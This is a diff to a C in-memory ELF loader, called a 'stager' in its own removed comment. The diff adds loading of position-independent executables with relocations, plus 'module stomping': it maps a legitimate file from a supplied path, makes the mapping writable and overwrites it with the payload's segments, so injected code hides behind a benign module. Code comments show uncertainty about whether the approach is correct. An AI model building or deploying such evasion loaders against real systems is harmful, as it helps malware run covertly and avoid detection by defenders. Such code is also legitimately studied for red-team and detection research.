@@ -142,9 +142,62 @@ int elf_get_memory_bounds(char *elf_start, size_t *min_vaddr, size_t *max_vaddr)
   return 0;
 }
 
+// Handle relocations for ET_DYN (PIE) binaries
+// Currently only supports R_X86_64_RELATIVE for x86_64
+static int elf_relocate(char *elf_start, size_t base_addr) {
+  Elf_Ehdr *hdr = (Elf_Ehdr *)elf_start;
+  Elf_Shdr *shdr = (Elf_Shdr *)(elf_start + hdr->e_shoff);
+  
+  for (int i = 0; i < hdr->e_shnum; i++) {
+    if (shdr[i].sh_type == SHT_REL || shdr[i].sh_type == SHT_RELA) {
+      Elf_Shdr *rel_shdr = &shdr[i];
+      
+      // Determine if REL or RELA
+      int is_rela = (shdr[i].sh_type == SHT_RELA);
+      size_t ent_size = is_rela ? sizeof(Elf_Rela) : sizeof(Elf_Rel);
+      size_t count = rel_shdr->sh_size / ent_size;
+      
+      char *rel_addr = elf_start + rel_shdr->sh_offset;
+      
+      for (size_t j = 0; j < count; j++) {
+        size_t offset = 0;
+        size_t info = 0;
+        int64_t addend = 0;
+        
+        if (is_rela) {
+          Elf_Rela *rela = (Elf_Rela *)(rel_addr + j * sizeof(Elf_Rela));
+          offset = rela->r_offset;
+          info = rela->r_info;
+          addend = rela->r_addend;
+        } else {
+          Elf_Rel *rel = (Elf_Rel *)(rel_addr + j * sizeof(Elf_Rel));
+          offset = rel->r_offset;
+          info = rel->r_info;
+          addend = 0; // REL entries typically store addend in the target location
+        }
+        
+        int type = ELF_R_TYPE(info);
+        
+        // R_X86_64_RELATIVE = 8
+        if (type == 8) {
+             size_t *target = (size_t *)(base_addr + offset);
+             // For RELA, value = base + addend
+             // For REL, value = base + *target (addend in place)
+             if (is_rela) {
+                 *target = base_addr + addend;
+             } else {
+                 *target = base_addr + *target;
+             }
+        }
+      }
+    }
+  }
+  return 0;
+}
+
 
 int elf_load(char *elf_start, void *stack, int stack_size, size_t *base_addr,
-             size_t *entry, int pre_mapped) {
+             size_t *entry, int pre_mapped, const char *module_path) {
   DEBUG_PRINT("elf_load started\n");
   Elf_Ehdr *hdr;
   Elf_Phdr *phdr;
@@ -157,18 +210,108 @@ int elf_load(char *elf_start, void *stack, int stack_size, size_t *base_addr,
   hdr = (Elf_Ehdr *)elf_start;
   phdr = (Elf_Phdr *)(elf_start + hdr->e_phoff);
 
+  void *mapped_mem = NULL;
+
   if (hdr->e_type == ET_DYN) {
-    // We do NOT support ET_DYN (Shared Objects / PIE) anymore in this stager
-    // because providing a correct environment (libc, loader) is too complex.
-    DEBUG_PRINT("Error: ET_DYN not supported. Please use static ELF executable.\n");
-    return -1;
+    DEBUG_PRINT("ET_DYN (PIE) detected.\n");
+    // For PIE, we need to decide where to load.
+    // If module_path is provided, we try to stomp.
+    
+    if (module_path && module_path[0] != '\0') {
+      DEBUG_PRINT("Attempting module stomping on %s\n", module_path);
+      int fd = open(module_path, O_RDONLY, 0);
+      if (fd >= 0) {
+        // Get file size using lseek
+        long size = lseek(fd, 0, SEEK_END);
+        if (size > 0) {
+            size_t st_size = (size_t)size;
+            // Seek back to start
+            lseek(fd, 0, SEEK_SET);
+
+            // Calculate required size for our payload
+            size_t required_size = 0;
+             // We need to iterate PHDRs to find the total span
+             size_t min_v = -1, max_v = 0;
+             for (int i=0; i<hdr->e_phnum; i++) {
+                 if (phdr[i].p_type == PT_LOAD && phdr[i].p_memsz > 0) {
+                     size_t vstart = phdr[i].p_vaddr;
+                     size_t vend = vstart + phdr[i].p_memsz;
+                     if (vstart < min_v) min_v = vstart;
+                     if (vend > max_v) max_v = vend;
+                 }
+             }
+             required_size = max_v - min_v; // Assuming base 0 for calculation
+             
+             if (st_size >= required_size) {
+                  // Map the legitimate file Copy-On-Write
+                  mapped_mem = (void *)mmap(NULL, st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+                  if (mapped_mem != MAP_FAILED) {
+                      DEBUG_PRINT("Mapped %s at %p\n", module_path, mapped_mem);
+                      
+                      // We need it writable to stomp
+                      if (mprotect(mapped_mem, st_size, PROT_READ | PROT_WRITE) == 0) {
+                           DEBUG_PRINT("Stomping memory...\n");
+                           // We will use this as base
+                           base = (size_t)mapped_mem;
+                           
+                           // We need to unmap it and remap? 
+                           // No, effectively we just overwrote the memory view with the file content, 
+                           // now we overwrite it with OUR content.
+                           // BUT we need to handle segments correctly.
+                           // Actually, we should just use this mapped region as the "heap" for our segments.
+                      } else {
+                           DEBUG_PRINT("mprotect RW failed\n");
+                           munmap(mapped_mem, st_size);
+                           mapped_mem = NULL;
+                      }
+                  }
+             } else {
+                 DEBUG_PRINT("Module file too small (%ld vs %ld)\n", (long)st_size, (long)required_size);
+             }
+        }
+        close(fd);
+      } else {
+           DEBUG_PRINT("Failed to open module path\n");
+      }
+    }
+    
+    if (mapped_mem) {
+        // Stomping successful so far
+    } else {
+        DEBUG_PRINT("Falling back to anonymous memory\n");
+        base = 0; // We will let the first segment mmap determine the base if not pre-calculated?
+        // For PIE in anonymous memory, we usually just mmap a big chunk or let the OS decide.
+        // However, the provided loader logic does per-segment mmap.
+        // If base is 0, we need to pick a base or let the first segment pick it.
+        // But headers usually have 0-based vaddrs for PIE.
+        // So we need to allocate a base region first.
+        
+        // Let's just calculate total size and mmap a region
+         size_t min_v = -1, max_v = 0;
+         for (int i=0; i<hdr->e_phnum; i++) {
+             if (phdr[i].p_type == PT_LOAD && phdr[i].p_memsz > 0) {
+                 size_t vstart = phdr[i].p_vaddr;
+                 size_t vend = vstart + phdr[i].p_memsz;
+                 if (vstart < min_v) min_v = vstart;
+                 if (vend > max_v) max_v = vend;
+             }
+         }
+         size_t total_size = max_v - min_v;
+         mapped_mem = mmap(NULL, total_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+         if (mapped_mem == MAP_FAILED) {
+             DEBUG_PRINT("Failed to allocate anonymous memory\n");
+             return -1;
+         }
+         base = (size_t)mapped_mem;
+    }
+
   } else {
     base = 0;
     DEBUG_PRINT("Static ELF, base set to 0\n");
   }
 
   if (base_addr != NULL)
-    *base_addr = -1;
+    *base_addr = base; // Set base addr
 
   if (entry != NULL) {
     *entry = base + hdr->e_entry;
@@ -200,40 +343,62 @@ int elf_load(char *elf_start, void *stack, int stack_size, size_t *base_addr,
                 phdr[x].p_vaddr, map_size, phdr[x].p_flags);
 
     void *m = NULL;
-    if (!pre_mapped) {
-        m = (void *)mmap((void *)(base + (size_t)map_start), map_size,
-                               PROT_READ | PROT_WRITE, // Map RW for loading/relocation
-                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
-        if ((long)m < 0) {
-          DEBUG_PRINT("mmap failed for segment %d at %p\n", x, (void*)(base + (size_t)map_start));
-          return -1;
-        }
-    } else {
-        // Assume memory is already mapped at the desired location
+    if (hdr->e_type == ET_DYN) {
+        // For PIE, we copy into our pre-allocated/mapped region
         m = (void *)(base + (size_t)map_start);
-        DEBUG_PRINT("Using pre-mapped memory at %p\n", m);
+        
+        // If we are stomping (mapped_mem is set and it was mmapped from file), 
+        // OR if we are using anonymous memory (mapped_mem is set),
+        // we already have the underlying memory.
+        
+        // However, we need to ensure permissions are RW for now.
+        // For partial stomping (if we used mmap with file), the whole region is RW.
+        
+        // Copy segment data
+        memcpy((void *)base + phdr[x].p_vaddr, elf_start + phdr[x].p_offset, phdr[x].p_filesz);
+        
+        // Zero-out BSS
+        if (phdr[x].p_memsz > phdr[x].p_filesz)
+          memset((void *)(base + phdr[x].p_vaddr + phdr[x].p_filesz), 0,
+                 phdr[x].p_memsz - phdr[x].p_filesz);
+                 
+    } else {
+        // Static executable (ET_EXEC) - classic behavior
+        if (!pre_mapped) {
+            m = (void *)mmap((void *)(base + (size_t)map_start), map_size,
+                                   PROT_READ | PROT_WRITE, // Map RW for loading/relocation
+                                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+            if ((long)m < 0) {
+              DEBUG_PRINT("mmap failed for segment %d at %p\n", x, (void*)(base + (size_t)map_start));
+              return -1;
+            }
+        } else {
+            m = (void *)(base + (size_t)map_start);
+        }
+
+        memcpy((void *)base + phdr[x].p_vaddr, elf_start + phdr[x].p_offset, phdr[x].p_filesz);
+
+        // Zero-out BSS
+        if (phdr[x].p_memsz > phdr[x].p_filesz)
+          memset((void *)(base + phdr[x].p_vaddr + phdr[x].p_filesz), 0,
+                 phdr[x].p_memsz - phdr[x].p_filesz);
     }
-
-    memcpy((void *)base + phdr[x].p_vaddr, elf_start + phdr[x].p_offset, phdr[x].p_filesz);
-
-    // Zero-out BSS
-    if (phdr[x].p_memsz > phdr[x].p_filesz)
-      memset((void *)(base + phdr[x].p_vaddr + phdr[x].p_filesz), 0,
-             phdr[x].p_memsz - phdr[x].p_filesz);
 
     segments[seg_count].m = m;
     segments[seg_count].size = map_size;
     segments[seg_count].prot = elf_prot;
     seg_count++;
-
-    if (base_addr != NULL && (*base_addr == (size_t)-1 || *base_addr > (size_t)m))
-      *base_addr = (size_t)m;
   }
-
-
+  
+  // Perform relocations if PIE
+  if (hdr->e_type == ET_DYN) {
+      DEBUG_PRINT("Relocating...\n");
+      elf_relocate(elf_start, base);
+  }
 
   // Set proper protection on all sections
   for (int i = 0; i < seg_count; i++) {
+    // For PIE, m is absolute address. For static, it is also absolute.
     if (mprotect(segments[i].m, segments[i].size, segments[i].prot) < 0) {
       DEBUG_PRINT("mprotect failed for segment %d\n", i);
     }
@@ -243,7 +408,7 @@ int elf_load(char *elf_start, void *stack, int stack_size, size_t *base_addr,
   return 0;
 }
 
-int elf_run(void *buf, char **argv, char **env, int pre_mapped) {
+int elf_run(void *buf, char **argv, char **env, int pre_mapped, const char *module_path) {
   DEBUG_PRINT("elf_run started\n");
   size_t x;
   int str_len;
@@ -292,7 +457,7 @@ int elf_run(void *buf, char **argv, char **env, int pre_mapped) {
   DEBUG_PRINT("Stack allocated at %p\n", stack);
 
   // Map the ELF in memory
-  if (elf_load(buf, stack, STACK_SIZE, &elf_base, &elf_entry, pre_mapped) < 0) {
+  if (elf_load(buf, stack, STACK_SIZE, &elf_base, &elf_entry, pre_mapped, module_path) < 0) {
     DEBUG_PRINT("elf_load failed\n");
     return -1;
   }
@@ -301,10 +466,10 @@ int elf_run(void *buf, char **argv, char **env, int pre_mapped) {
   // Check if this is a shared object and find main symbol
 
 
-  if (hdr->e_type == ET_DYN) {
-      DEBUG_PRINT("Error: Shared Objects not supported.\n");
-      return -1;
-  }
+  // if (hdr->e_type == ET_DYN) {
+  //     DEBUG_PRINT("Error: Shared Objects not supported.\n");
+  //     return -1;
+  // }
 
   unsigned long *stack_storage =
       stack + STACK_SIZE - STACK_STORAGE_SIZE - STACK_STRING_SIZE;
